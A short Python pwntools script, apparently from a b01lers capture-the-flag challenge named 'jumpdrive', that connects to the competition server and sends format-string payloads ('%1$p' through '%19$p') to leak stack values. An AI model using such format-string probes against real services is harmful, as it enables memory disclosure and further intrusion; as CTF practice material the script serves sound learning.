from pwn import *
context.log_level="error"
for i in range(1,20):
    #p=process("./jumpdrive")
    p=remote("pwn.ctf.b01lers.com",1002)
    p.recvuntil(" going?")
    payload=""
    payload+="%"+str(i)+"$p"
    p.sendline(payload)
    try:
        p.recvline()
        print p.recvline()
    except:
        print ""
    p.close()




















